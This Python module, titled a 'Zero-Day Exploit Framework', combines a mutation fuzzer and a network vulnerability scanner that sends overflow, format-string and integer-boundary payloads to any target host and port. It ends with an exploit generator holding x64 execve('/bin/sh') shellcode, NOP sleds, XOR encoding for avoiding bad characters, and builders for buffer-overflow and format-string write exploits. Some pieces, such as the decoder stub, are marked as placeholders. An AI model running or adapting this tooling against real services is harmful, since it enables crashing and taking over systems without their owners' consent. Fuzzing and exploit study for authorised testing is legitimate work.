"""
Zero-Day Exploit Framework

Advanced vulnerability exploitation and discovery framework:
- Protocol fuzzing with intelligent mutation
- Memory corruption detection
- Format string vulnerability testing
- Integer overflow detection
- Race condition exploitation
- Use-after-free detection patterns
- Heap spray techniques
- ROP chain generation helpers
"""

import asyncio
import struct
import random
import hashlib
import time
import socket
from typing import Optional, List, Dict, Any, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum, auto
from collections import deque
import logging

logger = logging.getLogger(__name__)


class VulnerabilityType(Enum):
    """Types of vulnerabilities to test"""
    BUFFER_OVERFLOW = auto()
    FORMAT_STRING = auto()
    INTEGER_OVERFLOW = auto()
    HEAP_OVERFLOW = auto()
    USE_AFTER_FREE = auto()
    RACE_CONDITION = auto()
    NULL_POINTER = auto()
    DOUBLE_FREE = auto()
    TYPE_CONFUSION = auto()
    COMMAND_INJECTION = auto()
    SQL_INJECTION = auto()
    XXE = auto()
    SSRF = auto()
    DESERIALIZATION = auto()


@dataclass
class FuzzingResult:
    """Result of a fuzzing attempt"""
    payload: bytes
    response: Optional[bytes]
    response_time: float
    crashed: bool
    anomaly_detected: bool
    anomaly_type: Optional[str]
    vulnerability_type: Optional[VulnerabilityType]
    confidence: float


@dataclass
class ExploitPayload:
    """Exploit payload configuration"""
    name: str
    payload: bytes
    target_vuln: VulnerabilityType
    platform: str  # linux, windows, bsd
    arch: str  # x86, x64, arm
    shellcode: Optional[bytes] = None
    rop_chain: Optional[List[int]] = None


class IntelligentFuzzer:
    """
    Intelligent protocol fuzzer with mutation strategies:
    - Bit flipping
    - Byte insertion/deletion
    - Integer boundary testing
    - Format string injection
    - Structure-aware mutation
    """
    
    def __init__(self, seed_corpus: List[bytes] = None):
        self.seed_corpus = seed_corpus or []
        self.mutation_history = deque(maxlen=10000)
        self.interesting_inputs = []
        self.coverage_map = {}
        self.crash_inputs = []
        
    def add_seed(self, data: bytes):
        """Add seed input to corpus"""
        self.seed_corpus.append(data)
    
    def mutate(self, data: bytes, strategy: str = "random") -> bytes:
        """Apply mutation strategy to input"""
        strategies = {
            "bit_flip": self._bit_flip,
            "byte_flip": self._byte_flip,
            "insert": self._insert_bytes,
            "delete": self._delete_bytes,
            "duplicate": self._duplicate_region,
            "arithmetic": self._arithmetic_mutation,
            "interesting": self._interesting_values,
            "havoc": self._havoc_mutation,
            "splice": self._splice_mutation,
        }
        
        if strategy == "random":
            strategy = random.choice(list(strategies.keys()))
        
        mutator = strategies.get(strategy, self._bit_flip)
        return mutator(data)
    
    def _bit_flip(self, data: bytes) -> bytes:
        """Flip random bits"""
        if not data:
            return data
        data = bytearray(data)
        num_flips = random.randint(1, max(1, len(data) // 10))
        for _ in range(num_flips):
            pos = random.randint(0, len(data) - 1)
            bit = random.randint(0, 7)
            data[pos] ^= (1 << bit)
        return bytes(data)
    
    def _byte_flip(self, data: bytes) -> bytes:
        """Flip random bytes"""
        if not data:
            return data
        data = bytearray(data)
        num_flips = random.randint(1, max(1, len(data) // 20))
        for _ in range(num_flips):
            pos = random.randint(0, len(data) - 1)
            data[pos] = random.randint(0, 255)
        return bytes(data)
    
    def _insert_bytes(self, data: bytes) -> bytes:
        """Insert random bytes"""
        data = bytearray(data)
        pos = random.randint(0, len(data))
        insert_len = random.randint(1, 32)
        insert_data = bytes([random.randint(0, 255) for _ in range(insert_len)])
        return bytes(data[:pos] + insert_data + data[pos:])
    
    def _delete_bytes(self, data: bytes) -> bytes:
        """Delete random bytes"""
        if len(data) < 2:
            return data
        data = bytearray(data)
        start = random.randint(0, len(data) - 1)
        length = random.randint(1, min(32, len(data) - start))
        return bytes(data[:start] + data[start + length:])
    
    def _duplicate_region(self, data: bytes) -> bytes:
        """Duplicate a region of data"""
        if len(data) < 2:
            return data
        start = random.randint(0, len(data) - 1)
        length = random.randint(1, min(64, len(data) - start))
        region = data[start:start + length]
        insert_pos = random.randint(0, len(data))
        return data[:insert_pos] + region + data[insert_pos:]
    
    def _arithmetic_mutation(self, data: bytes) -> bytes:
        """Apply arithmetic operations to integers in data"""
        if len(data) < 4:
            return data
        data = bytearray(data)
        
        # Find aligned positions for integer operations
        pos = random.randint(0, len(data) - 4) & ~3
        
        # Read as integer
        value = struct.unpack('<I', data[pos:pos+4])[0]
        
        # Apply arithmetic
        ops = [
            lambda x: x + random.randint(1, 35),
            lambda x: x - random.randint(1, 35),
            lambda x: x * 2,
            lambda x: x // 2,
            lambda x: x ^ 0xFFFFFFFF,
            lambda x: 0,
            lambda x: 0xFFFFFFFF,
            lambda x: 0x7FFFFFFF,
            lambda x: 0x80000000,
        ]
        
        value = ops[random.randint(0, len(ops) - 1)](value) & 0xFFFFFFFF
        data[pos:pos+4] = struct.pack('<I', value)
        
        return bytes(data)
    
    def _interesting_values(self, data: bytes) -> bytes:
        """Insert interesting boundary values"""
        if len(data) < 4:
            return data
        data = bytearray(data)
        
        interesting_8 = [0, 1, 16, 32, 64, 100, 127, 128, 255]
        interesting_16 = [0, 1, 32, 128, 255, 256, 512, 1000, 1024, 4096, 
                         32767, 32768, 65535]
        interesting_32 = [0, 1, 32, 128, 255, 256, 512, 1000, 1024, 4096,
                         32767, 32768, 65535, 65536, 100000, 0x7FFFFFFF,
                         0x80000000, 0xFFFFFFFF]
        
        # Choose size and value
        size = random.choice([1, 2, 4])
        pos = random.randint(0, max(0, len(data) - size))
        
        if size == 1:
            data[pos] = random.choice(interesting_8)
        elif size == 2:
            value = random.choice(interesting_16)
            data[pos:pos+2] = struct.pack('<H', value)
        else:
            value = random.choice(interesting_32)
            data[pos:pos+4] = struct.pack('<I', value)
        
        return bytes(data)
    
    def _havoc_mutation(self, data: bytes) -> bytes:
        """Apply multiple random mutations (havoc mode)"""
        result = bytearray(data)
        num_mutations = random.randint(1, 16)
        
        for _ in range(num_mutations):
            mutation = random.choice([
                self._bit_flip,
                self._byte_flip,
                self._insert_bytes,
                self._delete_bytes,
                self._arithmetic_mutation,
                self._interesting_values,
            ])
            result = bytearray(mutation(bytes(result)))
        
        return bytes(result)
    
    def _splice_mutation(self, data: bytes) -> bytes:
        """Splice with another input from corpus"""
        if not self.seed_corpus or len(data) < 4:
            return self._havoc_mutation(data)
        
        other = random.choice(self.seed_corpus)
        if len(other) < 4:
            return data
        
        # Find splice point
        splice_at = random.randint(1, len(data) - 1)
        other_at = random.randint(1, len(other) - 1)
        
        return data[:splice_at] + other[other_at:]
    
    def generate_format_string_payloads(self) -> List[bytes]:
        """Generate format string vulnerability test payloads"""
        payloads = []
        
        # Basic format strings
        basic = [
            b"%s" * 100,
            b"%x" * 100,
            b"%n" * 10,
            b"%s%s%s%s%s%s%s%s%s%s",
            b"%08x." * 20,
            b"AAAA%08x.%08x.%08x.%08x.%08x",
            b"%p" * 50,
            b"%.9999999s",
            b"%99999999s",
            b"%.1024d",
        ]
        payloads.extend(basic)
        
        # Position-based format strings
        for i in range(1, 50):
            payloads.append(f"%{i}$x".encode())
            payloads.append(f"%{i}$s".encode())
            payloads.append(f"%{i}$n".encode())
            payloads.append(f"AAAA%{i}$08x".encode())
        
        # Width specifiers
        for width in [8, 16, 32, 64, 128, 256, 512, 1024, 4096, 65535]:
            payloads.append(f"%{width}x".encode())
            payloads.append(f"%{width}s".encode())
            payloads.append(f"%.{width}x".encode())
        
        return payloads
    
    def generate_overflow_payloads(self, max_size: int = 65536) -> List[bytes]:
        """Generate buffer overflow test payloads"""
        payloads = []
        
        # Pattern-based payloads for offset detection
        sizes = [64, 128, 256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65536]
        
        for size in sizes:
            if size > max_size:
                break
            
            # Cyclic pattern
            payloads.append(self._generate_cyclic_pattern(size))
            
            # A's
            payloads.append(b'A' * size)
            
            # Mixed pattern
            payloads.append(b'A' * (size // 2) + b'B' * (size // 2))
            
            # With null bytes
            payloads.append(b'A' * (size - 4) + b'\x00\x00\x00\x00')
            
            # With newlines
            payloads.append(b'A' * (size - 2) + b'\r\n')
        
        return payloads
    
    def _generate_cyclic_pattern(self, size: int) -> bytes:
        """Generate cyclic pattern for offset detection"""
        pattern = bytearray()
        chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
        
        for i in range(size):
            pattern.append(chars[i % len(chars)])
        
        return bytes(pattern)
    
    def generate_integer_overflow_payloads(self) -> List[bytes]:
        """Generate integer overflow test payloads"""
        payloads = []
        
        # Boundary values
        boundaries = [
            0, 1, -1,
            127, 128, 255, 256,
            32767, 32768, 65535, 65536,
            2147483647, 2147483648, 4294967295, 4294967296,
            0x7FFFFFFF, 0x80000000, 0xFFFFFFFF,
            0x7FFFFFFFFFFFFFFF, 0x8000000000000000, 0xFFFFFFFFFFFFFFFF,
        ]
        
        for value in boundaries:
            # Little endian
            if value <= 0xFF:
                payloads.append(struct.pack('<B', value & 0xFF))
            if value <= 0xFFFF:
                payloads.append(struct.pack('<H', value & 0xFFFF))
            if value <= 0xFFFFFFFF:
                payloads.append(struct.pack('<I', value & 0xFFFFFFFF))
            payloads.append(struct.pack('<Q', value & 0xFFFFFFFFFFFFFFFF))
            
            # Big endian
            if value <= 0xFFFFFFFF:
                payloads.append(struct.pack('>I', value & 0xFFFFFFFF))
        
        return payloads


class VulnerabilityScanner:
    """
    Automated vulnerability scanner for network services:
    - Service fingerprinting
    - Known vulnerability detection
    - Zero-day discovery through fuzzing
    """
    
    def __init__(self, target: str, port: int):
        self.target = target
        self.port = port
        self.fuzzer = IntelligentFuzzer()
        self.results: List[FuzzingResult] = []
        self.vulnerabilities: List[Dict[str, Any]] = []
        
    async def scan_buffer_overflow(self, protocol: str = "tcp") -> List[FuzzingResult]:
        """Scan for buffer overflow vulnerabilities"""
        results = []
        payloads = self.fuzzer.generate_overflow_payloads()
        
        for payload in payloads:
            result = await self._send_and_analyze(payload, protocol)
            results.append(result)
            
            if result.crashed or result.anomaly_detected:
                self.vulnerabilities.append({
                    'type': VulnerabilityType.BUFFER_OVERFLOW,
                    'payload': payload,
                    'result': result
                })
        
        return results
    
    async def scan_format_string(self, protocol: str = "tcp") -> List[FuzzingResult]:
        """Scan for format string vulnerabilities"""
        results = []
        payloads = self.fuzzer.generate_format_string_payloads()
        
        for payload in payloads:
            result = await self._send_and_analyze(payload, protocol)
            results.append(result)
            
            if result.anomaly_detected:
                # Check for format string indicators in response
                if result.response and self._detect_format_string_leak(result.response):
                    result.vulnerability_type = VulnerabilityType.FORMAT_STRING
                    result.confidence = 0.9
                    self.vulnerabilities.append({
                        'type': VulnerabilityType.FORMAT_STRING,
                        'payload': payload,
                        'result': result
                    })
        
        return results
    
    async def scan_integer_overflow(self, protocol: str = "tcp") -> List[FuzzingResult]:
        """Scan for integer overflow vulnerabilities"""
        results = []
        payloads = self.fuzzer.generate_integer_overflow_payloads()
        
        for payload in payloads:
            result = await self._send_and_analyze(payload, protocol)
            results.append(result)
            
            if result.crashed or result.anomaly_detected:
                self.vulnerabilities.append({
                    'type': VulnerabilityType.INTEGER_OVERFLOW,
                    'payload': payload,
                    'result': result
                })
        
        return results
    
    async def fuzz_protocol(self, seed_inputs: List[bytes], 
                          iterations: int = 1000,
                          protocol: str = "tcp") -> List[FuzzingResult]:
        """Fuzz protocol with intelligent mutations"""
        for seed in seed_inputs:
            self.fuzzer.add_seed(seed)
        
        results = []
        
        for i in range(iterations):
            # Select seed and mutate
            if self.fuzzer.seed_corpus:
                seed = random.choice(self.fuzzer.seed_corpus)
            else:
                seed = b'\x00' * 64
            
            # Apply mutation
            mutated = self.fuzzer.mutate(seed)
            
            # Send and analyze
            result = await self._send_and_analyze(mutated, protocol)
            results.append(result)
            
            # Track interesting inputs
            if result.anomaly_detected:
                self.fuzzer.interesting_inputs.append(mutated)
                if result.crashed:
                    self.fuzzer.crash_inputs.append(mutated)
            
            # Periodically add interesting inputs to corpus
            if i % 100 == 0 and self.fuzzer.interesting_inputs:
                self.fuzzer.add_seed(random.choice(self.fuzzer.interesting_inputs))
        
        return results
    
    async def _send_and_analyze(self, payload: bytes, protocol: str) -> FuzzingResult:
        """Send payload and analyze response"""
        start_time = time.time()
        response = None
        crashed = False
        anomaly_detected = False
        anomaly_type = None
        
        try:
            if protocol == "tcp":
                response = await self._send_tcp(payload)
            elif protocol == "udp":
                response = await self._send_udp(payload)
            
            response_time = time.time() - start_time
            
            # Analyze response for anomalies
            if response:
                anomaly_detected, anomaly_type = self._analyze_response(response, response_time)
            elif response_time > 5.0:
                # Timeout might indicate crash or hang
                anomaly_detected = True
                anomaly_type = "timeout"
                
        except ConnectionResetError:
            crashed = True
            anomaly_detected = True
            anomaly_type = "connection_reset"
            response_time = time.time() - start_time
        except ConnectionRefusedError:
            crashed = True
            anomaly_detected = True
            anomaly_type = "connection_refused"
            response_time = time.time() - start_time
        except Exception as e:
            anomaly_detected = True
            anomaly_type = f"exception:{type(e).__name__}"
            response_time = time.time() - start_time
        
        return FuzzingResult(
            payload=payload,
            response=response,
            response_time=response_time,
            crashed=crashed,
            anomaly_detected=anomaly_detected,
            anomaly_type=anomaly_type,
            vulnerability_type=None,
            confidence=0.5 if anomaly_detected else 0.0
        )
    
    async def _send_tcp(self, payload: bytes, timeout: float = 5.0) -> Optional[bytes]:
        """Send TCP payload"""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(self.target, self.port),
                timeout=timeout
            )
            
            writer.write(payload)
            await writer.drain()
            
            response = await asyncio.wait_for(
                reader.read(4096),
                timeout=timeout
            )
            
            writer.close()
            await writer.wait_closed()
            
            return response
        except asyncio.TimeoutError:
            return None
    
    async def _send_udp(self, payload: bytes, timeout: float = 5.0) -> Optional[bytes]:
        """Send UDP payload"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.setblocking(False)
        
        try:
            sock.sendto(payload, (self.target, self.port))
            
            # Wait for response
            await asyncio.sleep(0.1)
            
            try:
                response, _ = sock.recvfrom(4096)
                return response
            except BlockingIOError:
                return None
        finally:
            sock.close()
    
    def _analyze_response(self, response: bytes, response_time: float) -> Tuple[bool, Optional[str]]:
        """Analyze response for anomalies"""
        anomaly_detected = False
        anomaly_type = None
        
        # Check for error indicators
        error_patterns = [
            b'segmentation fault',
            b'stack smashing',
            b'buffer overflow',
            b'memory corruption',
            b'access violation',
            b'core dumped',
            b'SIGSEGV',
            b'SIGABRT',
            b'SIGBUS',
        ]
        
        response_lower = response.lower()
        for pattern in error_patterns:
            if pattern.lower() in response_lower:
                anomaly_detected = True
                anomaly_type = f"error_pattern:{pattern.decode()}"
                break
        
        # Check for unusual response time
        if response_time > 3.0:
            anomaly_detected = True
            anomaly_type = "slow_response"
        
        # Check for memory leak indicators (hex addresses)
        if b'0x' in response and len([c for c in response if c in b'0123456789abcdefABCDEF']) > 20:
            anomaly_detected = True
            anomaly_type = "possible_memory_leak"
        
        return anomaly_detected, anomaly_type
    
    def _detect_format_string_leak(self, response: bytes) -> bool:
        """Detect format string vulnerability indicators"""
        # Look for leaked memory addresses
        hex_pattern_count = response.count(b'0x')
        if hex_pattern_count > 5:
            return True
        
        # Look for repeated patterns that might be stack values
        if len(response) > 32:
            for i in range(0, len(response) - 8, 4):
                chunk = response[i:i+4]
                if response.count(chunk) > 3:
                    return True
        
        return False
    
    def get_vulnerability_report(self) -> Dict[str, Any]:
        """Generate vulnerability report"""
        return {
            'target': self.target,
            'port': self.port,
            'total_tests': len(self.results),
            'vulnerabilities_found': len(self.vulnerabilities),
            'crash_inputs': len(self.fuzzer.crash_inputs),
            'interesting_inputs': len(self.fuzzer.interesting_inputs),
            'vulnerabilities': [
                {
                    'type': v['type'].name,
                    'payload_size': len(v['payload']),
                    'payload_preview': v['payload'][:100].hex(),
                    'confidence': v['result'].confidence
                }
                for v in self.vulnerabilities
            ]
        }


class ExploitGenerator:
    """
    Generate exploit payloads for discovered vulnerabilities:
    - Shellcode generation
    - ROP chain building
    - Payload encoding
    """
    
    def __init__(self, arch: str = "x64", platform: str = "linux"):
        self.arch = arch
        self.platform = platform
        
    def generate_nop_sled(self, size: int) -> bytes:
        """Generate NOP sled"""
        if self.arch == "x64":
            return b'\x90' * size
        elif self.arch == "x86":
            return b'\x90' * size
        elif self.arch == "arm":
            return b'\x00\xf0\x20\xe3' * (size // 4)  # ARM NOP
        return b'\x90' * size
    
    def generate_shellcode_stub(self, command: str = "/bin/sh") -> bytes:
        """Generate basic shellcode stub (placeholder - real shellcode requires assembly)"""
        # This is a placeholder - real shellcode would be architecture-specific assembly
        if self.platform == "linux" and self.arch == "x64":
            # Placeholder for execve("/bin/sh") shellcode
            return (
                b'\x48\x31\xc0'  # xor rax, rax
                b'\x48\x31\xff'  # xor rdi, rdi
                b'\x48\x31\xf6'  # xor rsi, rsi
                b'\x48\x31\xd2'  # xor rdx, rdx
                b'\x50'          # push rax
                b'\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68'  # mov rbx, "//bin/sh"
                b'\x53'          # push rbx
                b'\x48\x89\xe7'  # mov rdi, rsp
                b'\xb0\x3b'      # mov al, 59 (execve)
                b'\x0f\x05'      # syscall
            )
        return b'\xcc' * 32  # INT3 placeholder
    
    def encode_payload(self, payload: bytes, encoder: str = "xor") -> bytes:
        """Encode payload to avoid bad characters"""
        if encoder == "xor":
            key = random.randint(1, 255)
            encoded = bytes([b ^ key for b in payload])
            # Prepend decoder stub
            decoder = self._generate_xor_decoder(key, len(payload))
            return decoder + encoded
        elif encoder == "alpha":
            return self._alphanumeric_encode(payload)
        return payload
    
    def _generate_xor_decoder(self, key: int, length: int) -> bytes:
        """Generate XOR decoder stub"""
        # Placeholder decoder stub
        return b'\xeb\x0d' + struct.pack('<I', length) + struct.pack('B', key)
    
    def _alphanumeric_encode(self, payload: bytes) -> bytes:
        """Encode payload using only alphanumeric characters"""
        # Simple base64-like encoding
        import base64
        return base64.b64encode(payload)
    
    def build_exploit_payload(self, vuln_type: VulnerabilityType,
                            offset: int,
                            return_address: int = 0x41414141) -> bytes:
        """Build complete exploit payload"""
        payload = b''
        
        if vuln_type == VulnerabilityType.BUFFER_OVERFLOW:
            # Padding to reach return address
            payload += b'A' * offset
            
            # Return address
            payload += struct.pack('<Q' if self.arch == 'x64' else '<I', return_address)
            
            # NOP sled
            payload += self.generate_nop_sled(64)
            
            # Shellcode
            payload += self.generate_shellcode_stub()
            
        elif vuln_type == VulnerabilityType.FORMAT_STRING:
            # Format string write primitive
            # Write return_address to offset
            payload = f"%{return_address & 0xFFFF}c%{offset}$hn".encode()
        
        return payload


__all__ = [
    'VulnerabilityType',
    'FuzzingResult',
    'ExploitPayload',
    'IntelligentFuzzer',
    'VulnerabilityScanner',
    'ExploitGenerator',
]
